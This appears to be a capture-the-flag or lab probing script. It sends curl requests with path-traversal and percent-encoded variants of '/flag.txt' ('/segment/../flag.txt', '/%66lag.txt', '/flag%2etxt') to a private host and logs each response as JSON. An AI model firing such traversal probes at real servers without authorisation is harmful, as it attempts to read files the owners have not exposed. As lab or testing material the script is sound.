import json


def main():
    try:
        from framework_evidence import run_tool
    except Exception as exc:
        print(json.dumps({"status": "helper_import_error", "error": repr(exc)}))
        return

    paths = [
        "/flag.txt",
        "/./flag.txt",
        "/segment/../flag.txt",
        "/%66lag.txt",
        "/flag%2etxt",
        "//flag.txt",
    ]
    for path in paths:
        url = "http://192.168.2.6" + path
        argv = [
            "curl", "--path-as-is", "--silent", "--show-error",
            "--include", "--max-time", "15", url,
        ]
        try:
            envelope = run_tool(argv)
            print(json.dumps({
                "requested_path": path,
                "url": url,
                "tool_envelope": envelope,
            }, ensure_ascii=False, default=str))
        except Exception as exc:
            print(json.dumps({
                "requested_path": path,
                "url": url,
                "execution_error": repr(exc),
            }, ensure_ascii=False))


if __name__ == "__main__":
    main()

